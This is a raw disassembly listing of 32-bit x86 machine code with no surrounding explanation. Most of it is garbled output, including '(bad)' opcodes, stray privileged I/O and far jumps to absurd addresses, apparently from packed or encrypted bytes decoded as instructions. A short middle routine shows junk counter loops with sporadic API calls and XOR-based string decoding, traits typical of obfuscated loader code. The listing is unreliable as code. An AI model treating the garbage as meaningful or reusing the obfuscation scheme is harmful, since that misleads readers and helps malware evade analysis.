  41012c:	fucomip st,st(1)
  41012e:	dec    edx
  41012f:	jno    0x4100b9
  410131:	enter  0x862e,0xe8
  410135:	or     edi,edi
  410137:	repnz imul esi,DWORD PTR [esi],0xe3340fa3
  41013e:	test   eax,0x43f5d001
  410143:	xchg   esp,eax
  410144:	loope  0x410122
  410146:	ror    ch,cl
  410148:	xor    eax,0x8f15fabe
  41014d:	xchg   esp,eax
  41014e:	(bad)  
  41014f:	in     al,dx
  410150:	push   0xffffffa9
  410152:	in     eax,0xe3
  410154:	fisubr WORD PTR [ebx+0x6c40e539]
  41015a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41015b:	imul   ecx,DWORD PTR [esi],0xffffffcf
  41015e:	mov    dl,0x73
  410160:	and    bh,BYTE PTR [esi-0x72561438]
  410166:	ins    DWORD PTR es:[edi],dx
  410167:	into   
  410168:	div    DWORD PTR [eax+0x7e]
  41016b:	mov    ecx,0x99080065
  410170:	iret   
  410171:	cmp    BYTE PTR [edi+0x6cfe1550],cl
  410177:	inc    eax
  410178:	enter  0xd254,0xe3
  41017c:	xrstor [ebx]
  41017f:	cwde   
  410180:	int    0x41
  410182:	pop    esp
  410183:	mov    ds:0xc50c018a,al
  410188:	mov    eax,0xc69e9935
  41018d:	sbb    DWORD PTR [edi+eiz*8],ecx
  410190:	push   cs
  410191:	sbb    DWORD PTR [edi+0x79],ebp
  410194:	jmp    0x272f:0x30e5b617
  41019b:	pop    ebx
  41019c:	xor    DWORD PTR [eax-0x1e],edx
  41019f:	in     al,dx
  4101a0:	add    bh,al
  4101a2:	scas   al,BYTE PTR es:[edi]
  4101a3:	xchg   edi,eax
  4101a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101a5:	pusha  
  4101a6:	pop    ss
  4101a7:	xchg   ecx,eax
  4101a8:	sbb    edx,DWORD PTR [eax]
  4101aa:	push   edx
  4101ab:	ds bswap ecx
  4101ae:	cli    
  4101af:	es cli 
  4101b1:	pop    edx
  4101b2:	xchg   DWORD PTR [esi+ecx*1],eax
  4101b5:	and    ah,cl
  4101b7:	sahf   
  4101b8:	(bad)  
  4101b9:	(bad)  
  4101ba:	hlt    
  4101bb:	pop    ecx
  4101bc:	cmp    al,0x55
  4101be:	retf   0xf9c9
  4101c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101c2:	jno    0x41021b
  4101c4:	nop
  4101c5:	xor    al,0x2d
  4101c7:	mov    ecx,0x9cef1291
  4101cc:	pop    ds
  4101cd:	and    BYTE PTR [ebx],cl
  4101cf:	bound  eax,QWORD PTR [ecx+0x45792214]
  4101d5:	lds    edi,FWORD PTR [edx+esi*1-0x2b]
  4101d9:	lods   eax,DWORD PTR ds:[esi]
  4101da:	inc    ebp
  4101db:	(bad)  
  4101dd:	sbb    eax,0xe18f7ff0
  4101e2:	in     eax,0x33
  4101e4:	xchg   ecx,eax
  4101e5:	mov    cs,eax
  4101e7:	test   eax,0xf39e4fba
  4101ec:	lods   eax,DWORD PTR ds:[esi]
  4101ed:	and    ebx,edi
  4101ef:	mov    ebp,0x4d9556a
  4101f4:	and    BYTE PTR [edi-0x6f],ch
  4101f7:	dec    eax
  4101f8:	retf   0x6525
  4101fb:	mov    cl,0x78
  4101fd:	dec    ecx
  4101fe:	pop    ebp
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x68,al
  41049c:	sbb    DWORD PTR [esp+ecx*4+0x7e7eb0dc],ebx
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x4104bc
  4104a8:	(bad)  [ebp-0x17]
  4104ab:	enter  0x2ca7,0x2a
  4104af:	jl     0x4104f4
  4104b1:	jp     0x4104e1
  4104b3:	std    
  4104b4:	cli    
  4104b5:	push   eax
  4104b6:	je     0x4104bc
  4104b8:	into   
  4104b9:	add    al,0x66
  4104bb:	iret   
  4104bc:	aad    0x7a
  4104be:	mov    ebx,0x756942e2
  4104c3:	ds jecxz 0x410453
  4104c6:	mov    BYTE PTR [esi-0x6de8b8b2],bl
  4104cc:	cmp    ecx,0x4a
  4104cf:	push   0x49
  4104d1:	push   ebx
  4104d2:	(bad)  
  4104d3:	jl     0x410512
  4104d5:	cmp    BYTE PTR [ecx+0x6c1eacc3],cl
  4104db:	mov    edi,0x74173984
  4104e0:	pop    eax
  4104e1:	jmp    0x4104c1
  4104e3:	cmp    al,0x35
  4104e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104e6:	fsubr  st,st(2)
  4104e8:	repnz mov eax,ds:0x753289ad
  4104ee:	bswap  edi
  4104f0:	mov    ds:0xefc3e271,eax
  4104f5:	out    dx,eax
  4104f6:	push   edi
  4104f7:	xlat   BYTE PTR ds:[ebx]
  4104f8:	inc    ecx
  4104f9:	dec    ecx
  4104fa:	jo     0x4104fb
  4104fc:	arpl   cx,cx
  4104fe:	cld    
  4104ff:	add    eax,0x237084ae
  410504:	shr    BYTE PTR [edi],1
  410506:	cld    
  410507:	add    ebx,DWORD PTR [eax]
  410509:	jo     0x410500
  41050b:	ins    BYTE PTR es:[edi],dx
  41050c:	sub    bl,dl
  41050e:	test   eax,0xf3ab9d82
  410513:	jae    0x41053d
  410515:	push   ds
  410516:	dec    eax
  410517:	sar    BYTE PTR [ebx],0x54
  41051a:	and    eax,0xe386f8cc
  41051f:	test   eax,0x6af4ea57
  410524:	mov    DWORD PTR [ecx],edx
  410526:	mov    ecx,0x471f3381
  41052b:	test   BYTE PTR [eax],dl
  41052d:	sahf   
  41052e:	mov    ecx,0x5776bd62
  410533:	mov    edi,DWORD PTR [edi-0x5e]
  410536:	xor    ah,ch
  410538:	aam    0x80
  41053a:	dec    edx
  41053b:	cmp    dh,al
  41053d:	dec    ebx
  41053e:	inc    edi
  41053f:	and    ch,BYTE PTR [esi-0x40]
  410542:	int    0xf6
  410544:	adc    al,0xbe
  410546:	xchg   edi,eax
  410547:	sub    al,0x9c
  410549:	jmp    0x978a9766
  41054e:	add    BYTE PTR [ecx-0x60c020e1],cl
  410554:	scas   al,BYTE PTR es:[edi]
  410555:	mov    ebp,0xe6350ec8
  41055a:	lods   al,BYTE PTR ds:[esi]
  41055b:	mov    esp,0xe08a5d55
  410560:	push   eax
  410561:	dec    ecx
  410562:	push   ecx
  410563:	leave  
  410564:	test   BYTE PTR [ecx-0x3],cl
  410567:	sbb    cl,bh
  410569:	mov    bh,0xb4
  41056b:	mov    edi,esi
  41056d:	adc    ah,dh
  41056f:	sbb    ah,bl
  410571:	iret   
  410572:	in     eax,0x18
  410574:	pop    eax
  410575:	retf   
  410576:	push   eax
  410577:	shr    BYTE PTR [ebx+0x33],1
  41057a:	pusha  
  41057b:	ret    
  41057c:	adc    al,0x3f
  41057e:	jae    0x4105eb
  410580:	inc    edi
  410581:	xchg   esi,eax
  410582:	jns    0x410547
  410584:	add    dl,ah
  410586:	add    bh,al
  410588:	or     al,0xdd
  41058a:	fstp   TBYTE PTR [edi+0x5be071fb]
  410590:	and    DWORD PTR gs:[edx+edi*4],0x55
  410595:	jo     0x410546
  410597:	test   al,0x7b
  410599:	sub    bl,BYTE PTR [edx]
  41059b:	call   0x2d7c:0x13a9ba63
  4105a2:	push   ebx
  4105a3:	call   0x7f6a:0xc7d54b06
  4105aa:	loopne 0x41060d
  4105ac:	lock jmp 0x84f2600f
  4105b2:	inc    esp
  4105b3:	mov    ch,0x6e
  4105b5:	xlat   BYTE PTR ds:[ebx]
  4105b6:	mov    esi,0xb0fb2470
  4105bb:	lds    eax,FWORD PTR [esi]
  4105bd:	out    0x80,al
  4105bf:	add    al,0xe0
  4105c1:	cwde   
  4105c2:	sub    DWORD PTR [ecx+0x68439412],esp
  4105c8:	mov    WORD PTR [ebx+edx*8+0x78c1801e],?
  4105cf:	mov    edi,0x2a894df1
  4105d4:	xchg   esp,eax
  4105d5:	clc    
  4105d6:	out    0x34,al
  4105d8:	jne    0x410647
  4105da:	imul   ah
  4105dc:	cmp    DWORD PTR [edx+0x8],eax
  4105df:	outs   dx,DWORD PTR ds:[esi]
  4105e0:	mov    ebx,0x5e0dd5d7
  4105e5:	adc    eax,0xc4448d3b
  4105ea:	daa    
  4105eb:	mov    cl,0x80
  4105ed:	lods   al,BYTE PTR ds:[esi]
  4105ee:	and    al,0xc1
  4105f0:	and    BYTE PTR [esi+0x3d],0xd6
  4105f4:	das    
  4105f5:	(bad)  
  4105f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105f7:	mov    ds:0xe452f976,eax
  4105fc:	pmulhuw mm0,QWORD PTR [ecx-0x5d9f18fa]
  410603:	cs or  al,0xe0
  410606:	in     eax,0xd7
  410608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410609:	add    ecx,DWORD PTR [edi+ebx*8+0x4cc85671]
  410610:	adc    eax,0xba3affd5
  410615:	test   DWORD PTR [ecx-0x44],0xcd7c4946
  41061c:	jnp    0x410643
  41061e:	repz fadd QWORD PTR es:[esi-0x4d]
  410623:	cmp    bl,BYTE PTR [ecx+edx*8-0x6826a157]
  41062a:	sahf   
  41062b:	sbb    esi,DWORD PTR [ecx-0x98e6cc7]
  410631:	gs inc edx
  410633:	sub    al,0xbf
  410635:	dec    ebx
  410636:	test   DWORD PTR [eax],0x740c0fdd
  41063c:	pop    esp
  41063d:	jmp    0x1038:0xe60d1856
  410644:	dec    ebp
  410645:	inc    edx
  410646:	sub    eax,0x787a228e
  41064b:	pop    ebp
  41064c:	jp     0x410614
  41064e:	mov    esp,0x211b29ac
  410653:	pop    edi
  410654:	arpl   WORD PTR [ebx],sp
  410656:	jb     0x41065c
  410658:	les    esp,FWORD PTR [eax]
  41065a:	scas   al,BYTE PTR es:[edi]
  41065b:	pop    esi
  41065c:	mov    ebp,0x7a41c2b4
  410661:	push   edi
  410662:	retf   
  410663:	cmp    al,BYTE PTR ds:0xc95c9212
  410669:	mov    al,ds:0x41dde95a
  41066e:	into   
  41066f:	inc    ebp
  410670:	jne    0x4105f5
  410672:	jp     0x410692
  410674:	daa    
  410675:	mov    dl,0x8a
  410677:	pop    esp
  410678:	mov    dh,0x8d
  41067a:	les    ebp,FWORD PTR [edx-0x16]
  41067d:	dec    esp
  41067e:	xor    DWORD PTR [esi-0x5e96c660],esi
  410684:	(bad)  
  410685:	xchg   ebx,eax
  410686:	jmp    0x67de31c1
  41068b:	inc    eax
  41068c:	aas    
  41068d:	jno    0x4106e8
  41068f:	and    cl,dh
  410691:	aas    
  410692:	sub    ebx,DWORD PTR [ecx]
  410694:	inc    ecx
  410695:	inc    esp
  410696:	jmp    0xa0db2108
  41069b:	pop    es
  41069c:	sti    
  41069d:	mov    eax,0x96f5ee2e
  4106a2:	popa   
  4106a3:	add    al,0xcb
  4106a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a6:	mov    DWORD PTR [esi+0x2b078699],edi
  4106ac:	fwait
  4106ad:	push   eax
  4106ae:	shl    DWORD PTR [eax-0x59],1
  4106b1:	sbb    dl,BYTE PTR [edi+0x20]
  4106b4:	pop    es
  4106b5:	mov    esi,0x4a853c8a
  4106ba:	inc    eax
  4106bb:	popa   
  4106bc:	into   
  4106bd:	ret    0xb2ac
  4106c0:	mov    ebx,ecx
  4106c2:	pop    edi
  4106c3:	ret    0xd3a1
  4106c6:	lahf   
  4106c7:	mov    al,0x4
  4106c9:	dec    esi
  4106ca:	leave  
  4106cb:	jbe    0x4106bb
  4106cd:	sub    cl,BYTE PTR [ecx-0x7f]
  4106d0:	push   0x73
  4106d2:	ror    BYTE PTR ds:0x5e4bc96e,0xf6
  4106d9:	mov    bl,0x44
  4106db:	adc    eax,0x1024689f
  4106e0:	add    al,0x8
  4106e2:	repnz mov ds:0x80477d37,al
  4106e8:	and    BYTE PTR [edi],dh
  4106ea:	xor    al,0xc9
  4106ec:	xchg   ebp,eax
  4106ed:	fstp   DWORD PTR [ebx+ebp*8+0xf]
  4106f1:	mov    esi,0x2947671e
  4106f6:	scas   eax,DWORD PTR es:[edi]
  4106f7:	push   ebx
  4106f8:	jne    0x410701
  4106fa:	and    dl,BYTE PTR [ebp+edx*1+0x28]
  4106fe:	retf   
  4106ff:	out    dx,al
  410700:	xor    ecx,DWORD PTR [ebp-0x1a]
  410703:	xor    DWORD PTR [ecx+0x7d],eax
  410706:	cdq    
  410707:	pushf  
  410708:	mov    esp,0x1f52bcc
  41070d:	jp     0x410722
  41070f:	jns    0x410778
  410711:	sbb    dl,bh
  410713:	lock das 
  410715:	pop    ss
  410716:	outs   dx,DWORD PTR ds:[esi]
  410717:	out    dx,al
  410718:	adc    bl,BYTE PTR [eax+0x1b]
  41071b:	xor    BYTE PTR [ecx],ch
  41071d:	pop    edx
  41071e:	push   ds
  41071f:	inc    ebx
  410720:	test   DWORD PTR [esi],esi
  410722:	loop   0x410758
  410724:	imul   edx,DWORD PTR [ebx],0x32
  410727:	pop    edi
  410728:	jmp    0xf0bc2579
  41072d:	stos   DWORD PTR es:[edi],eax
  41072e:	popa   
  41072f:	imul   esi,ecx,0x13
  410732:	ins    DWORD PTR es:[edi],dx
  410733:	cmp    bh,BYTE PTR [bp+di+0x1]
  410737:	dec    esp
  410738:	sbb    ch,bl
  41073a:	sub    bh,BYTE PTR [ebx]
  41073c:	mov    bh,0x9c
  41073e:	mov    ah,0x95
  410740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410741:	(bad)  
  410742:	jnp    0x41079c
  410744:	lds    esi,FWORD PTR [edi-0x629ada83]
  41074a:	test   dl,dh
  41074c:	icebp  
  41074d:	mov    ds:0xee8366f8,eax
  410752:	fdiv   DWORD PTR [ebx+0x58fac67f]
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xdd51f325
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x41075f
  41078c:	xchg   ebp,eax
  41078d:	jge    0x4107ef
  41078f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410790:	nop
  410791:	xchg   ebp,eax
  410792:	test   eax,0xb631e51b
  410797:	pop    esi
  410798:	xlat   BYTE PTR ds:[ebx]
  410799:	pop    edx
  41079a:	push   ecx
  41079b:	ret    0xbc94
  41079e:	inc    ebx
  41079f:	pmulhw mm2,QWORD PTR [bp+si+0x1317]
  4107a5:	jbe    0xeba8d6aa
  4107ab:	sbb    BYTE PTR [edi-0x1e],al
  4107ae:	push   esi
  4107af:	dec    eax
  4107b0:	ret    0xa541
  4107b3:	and    BYTE PTR [ebp-0xb],bh
  4107b6:	add    BYTE PTR [edx+esi*1],ch
  4107b9:	dec    edi
  4107ba:	mov    ch,0xcb
  4107bc:	jne    0x410815
  4107be:	jne    0x4107b6
  4107c0:	popf   
  4107c1:	mov    cl,0x33
  4107c3:	js     0x4107b2
  4107c5:	push   ebx
  4107c6:	addr16 mov esp,0x3f5d773b
  4107cc:	push   ebp
  4107cd:	push   edi
  4107ce:	push   edi
  4107cf:	fcomp  DWORD PTR [edi]
  4107d1:	jmp    0x4107c3
  4107d3:	pmulhuw mm6,QWORD PTR [edx+0x52c94c5]
  4107da:	inc    esp
  4107db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107dc:	jl     0x410832
  4107de:	pop    DWORD PTR [edx-0x6c61bfdb]
  4107e4:	or     ebx,edi
  4107e6:	inc    edx
  4107e7:	stos   DWORD PTR es:[edi],eax
  4107e8:	push   es
  4107e9:	popf   
  4107ea:	and    BYTE PTR [ebp+0x33],bh
  4107ed:	pusha  
  4107ee:	ja     0x4107dd
  4107f0:	dec    edi
  4107f1:	inc    eax
  4107f2:	xor    esi,DWORD PTR ds:0x7b764867
  4107f8:	xchg   esp,eax
  4107f9:	sbb    al,0xec
  4107fb:	pop    ss
  4107fc:	mov    bl,0xbe
  4107fe:	(bad)  
  4107ff:	scas   al,BYTE PTR es:[edi]
  410800:	mov    cl,0xf7
  410802:	pushf  
  410803:	mov    bh,0xa2
  410805:	sti    
  410806:	add    al,0x77
  410808:	jne    0x410888
  41080a:	(bad)  
  41080c:	in     al,0x3f
  41080e:	mov    ecx,0xe0b9f391
  410813:	sti    
  410814:	inc    ebp
  410815:	add    BYTE PTR ds:0xa69b3d7f,dh
  41081b:	mov    edx,es
  41081d:	ins    DWORD PTR es:[edi],dx
  41081e:	adc    eax,DWORD PTR [edi-0x7e]
  410821:	shl    BYTE PTR cs:[ebx-0x4],1
  410825:	push   edi
  410826:	in     eax,dx
  410827:	(bad)  
  410829:	add    BYTE PTR [ebp+0x33],ch
  41082c:	xchg   esi,eax
  41082d:	mov    ah,0x35
  41082f:	mov    ds:0xafab4900,eax
  410834:	cmp    BYTE PTR [edi-0x1ba58608],dh
  41083a:	push   ds
  41083b:	xchg   edi,eax
  41083c:	xchg   DWORD PTR [edi],edx
  41083e:	cmp    DWORD PTR [ebp+ebp*8-0x5d0a389a],0x16
  410846:	lahf   
  410847:	push   0xbb569e8a
  41084c:	push   es
  41084d:	and    eax,0x1044ee3b
  410852:	add    eax,0x6e52c3ee
  410857:	inc    edx
  410858:	out    dx,al
  410859:	scas   al,BYTE PTR es:[edi]
  41085a:	pop    es
  41085b:	push   cs
  41085c:	jb     0x41082e
  41085e:	mov    eax,ds:0x564ab450
  410863:	fwait
  410864:	add    eax,0xcfe8b5dc
  410869:	ret    0x2c08
  41086c:	add    al,dl
  41086e:	mov    al,ds:0x156a4660
  410873:	sti    
  410874:	or     eax,0x7ef91b0
  410879:	xor    al,0xca
  41087b:	pusha  
  41087c:	cmp    eax,0xf10c4203
  410881:	icebp  
  410882:	cmp    BYTE PTR [edi+0x34207277],bl
  410888:	in     al,0xf2
  41088a:	pop    ebp
  41088b:	loop   0x410846
  41088d:	jno    0x41081d
  41088f:	popf   
  410890:	cwde   
  410891:	push   ss
  410892:	or     eax,0xdab2d26d
  410897:	pop    ds
  410898:	inc    edi
  410899:	jnp    0x410848
  41089b:	inc    edi
  41089c:	ja     0x41084e
  41089e:	es mov cl,0x59
  4108a1:	xor    ebp,DWORD PTR [ebp+0x28]
  4108a4:	jp     0x4108d2
  4108a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a7:	jge    0x4108c0
  4108a9:	mov    dh,0x44
  4108ab:	aaa    
  4108ac:	xchg   edi,eax
  4108ad:	or     BYTE PTR [esi],al
  4108af:	fwait
  4108b0:	outs   dx,BYTE PTR ds:[esi]
  4108b1:	(bad)  
  4108b2:	gs or  edi,edx
  4108b5:	jnp    0x4108ad
  4108b7:	(bad)  
  4108b9:	jae    0x4108ad
  4108bb:	data16 (bad) 
  4108bd:	(bad)  
  4108be:	adc    al,0x66
  4108c0:	push   es
  4108c1:	sar    bh,1
  4108c3:	retf   0x4ba0
  4108c6:	icebp  
  4108c7:	in     eax,dx
  4108c8:	rcl    al,1
  4108ca:	sub    al,0xf1
  4108cc:	mov    eax,ds:0x84ba81c7
  4108d1:	imul   esp,DWORD PTR [ebx],0x8b9a6279
  4108d7:	xor    dh,dl
  4108d9:	lea    ecx,[edx-0x2c]
  4108dc:	or     edi,DWORD PTR [edx+0x4b06a6a7]
  4108e2:	in     al,dx
  4108e3:	stos   DWORD PTR es:[edi],eax
  4108e4:	in     al,dx
  4108e5:	or     eax,0x6cad84ab
  4108ea:	pop    ss
  4108eb:	in     eax,dx
  4108ec:	inc    esi
  4108ed:	pop    ds
  4108ee:	dec    edx
  4108ef:	mov    BYTE PTR [esi+0x59],bl
  4108f2:	fsub   DWORD PTR [esi]
  4108f4:	loop   0x410905
  4108f6:	jmp    0x7b65f6ec
  4108fb:	mov    eax,ds:0x4481a3c8
  410900:	in     eax,0xbd
  410902:	pop    ecx
  410903:	push   es
  410904:	mov    al,0x60
  410906:	or     al,0x34
  410908:	or     DWORD PTR [ecx+ecx*2-0x29],ebx
  41090c:	daa    
  41090d:	ret    
  41090e:	rcr    DWORD PTR [eax-0x6c],1
  410911:	inc    ebp
  410912:	sbb    eax,0x4be00aac
  410917:	nop
  410918:	test   al,0x35
  41091a:	or     eax,0xee7d83d5
  41091f:	mov    eax,0x2fee40f3
  410924:	fnsave [esi+0xcf47d70]
  41092a:	cmp    eax,0x1a29424a
  41092f:	mov    dl,0x6c
  410931:	or     al,0x4a
  410933:	mov    bl,0xc3
  410935:	mov    ebx,0xa8c70b9f
  41093a:	push   ebp
  41093b:	icebp  
  41093c:	fcom   DWORD PTR [eax+esi*8+0x7d23ee0]
  410943:	push   es
  410944:	mov    DWORD PTR [esi],ecx
  410946:	push   ss
  410947:	js     0x410979
  410949:	pop    ebp
  41094a:	inc    ebp
  41094b:	mov    al,ds:0x4052ab2b
  410950:	enter  0x6cb8,0xdf
  410954:	pushf  
  410955:	imul   ebx,edx,0xae874f2b
  41095b:	div    bh
  41095d:	ja     0x410943
  41095f:	out    0x48,al
  410961:	fimul  WORD PTR [ebx+edi*4+0x5fdbac04]
  410968:	mov    ebp,cs
  41096a:	xor    DWORD PTR [esi+edx*4-0x1edde409],ecx
  410971:	pop    ebx
  410972:	fiadd  DWORD PTR [eax-0x695548d]
  410978:	xchg   edi,eax
  410979:	pop    esi
  41097a:	cwde   
  41097b:	pop    edx
  41097c:	push   0x14
  41097e:	std    
  41097f:	mov    ecx,0xbf54ac80
  410984:	aad    0xa0
  410986:	(bad)  
  410987:	and    eax,0x1ece34e4
  41098c:	inc    edx
  41098d:	fiadd  WORD PTR [ecx]
  41098f:	push   ss
  410990:	(bad)  
  410991:	pop    ebp
  410992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410993:	(bad)  [ebx]
  410995:	ror    dl,1
  410997:	repz add ecx,0x23
  41099b:	rcl    DWORD PTR [edx+0x79c60f56],1
  4109a1:	dec    esi
  4109a2:	icebp  
  4109a3:	fistp  DWORD PTR [ebx-0x2a2b68d4]
  4109a9:	xchg   esi,edi
  4109ab:	cmp    al,0xed
  4109ad:	pop    ebp
  4109ae:	retf   
  4109af:	xchg   ebx,eax
  4109b0:	xor    al,0x71
  4109b2:	ins    DWORD PTR es:[edi],dx
  4109b3:	int3   
  4109b4:	add    BYTE PTR es:[ecx+0x6e4bd069],ah
  4109bb:	mov    bh,BYTE PTR [ecx]
  4109bd:	rcr    BYTE PTR ds:0x97e07905,cl
  4109c3:	lods   al,BYTE PTR ds:[esi]
  4109c4:	and    DWORD PTR [eax],edx
  4109c6:	bound  ebp,QWORD PTR [esi+0x69]
  4109c9:	add    edx,DWORD PTR [eax-0x3e]
  4109cc:	int3   
  4109cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ce:	or     DWORD PTR [ecx],ecx
  4109d0:	in     al,dx
  4109d1:	push   0xaca9ff8a
  4109d6:	sbb    BYTE PTR [edi],bh
  4109d8:	in     al,0x24
  4109da:	fistp  QWORD PTR [esp+esi*4+0x96b612c]
  4109e1:	xchg   ebx,eax
  4109e2:	loopne 0x4109bf
  4109e4:	dec    ebp
  4109e5:	inc    esp
  4109e6:	xor    BYTE PTR [ebx],bh
